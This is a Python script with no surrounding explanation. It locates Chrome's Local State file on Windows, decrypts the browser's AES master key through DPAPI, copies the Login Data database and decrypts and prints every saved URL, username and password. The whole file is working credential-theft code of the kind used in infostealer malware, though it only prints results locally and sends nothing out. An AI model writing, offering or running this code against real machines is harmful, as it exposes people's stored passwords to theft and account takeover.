import os
import json
import base64
import sqlite3
import shutil
from Cryptodome.Cipher import AES
import win32crypt

def get_master_key():
    """Retrieve and decrypt Chrome's AES master key"""
    local_state_path = os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data\Local State")
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]  # Remove 'DPAPI' prefix
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]  # Decrypt AES key

def decrypt_password(encrypted_password, master_key):
    """Decrypt Chrome stored password using AES"""
    try:
        iv = encrypted_password[3:15]  # Extract IV
        encrypted_data = encrypted_password[15:]  # Extract encrypted data
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_data)[:-16].decode()  # Decrypt and strip GCM tag
    except Exception as e:
        return f"[ERROR] {e}"  # Return error message instead of causing recursion

def get_chrome_passwords():
    """Extract and decrypt saved passwords from Chrome"""
    master_key = get_master_key()  # Get the decryption key once

    db_path = os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data\Default\Login Data")
    temp_db = os.path.join(os.environ["TEMP"], "chrome_login.db")

    shutil.copy2(db_path, temp_db)  # Copy DB to avoid lock issues
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for url, username, password in cursor.fetchall():
        decrypted_password = decrypt_password(password, master_key)
        print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n")

    conn.close()
    os.remove(temp_db)  # Cleanup

if __name__ == "__main__":
    get_chrome_passwords()


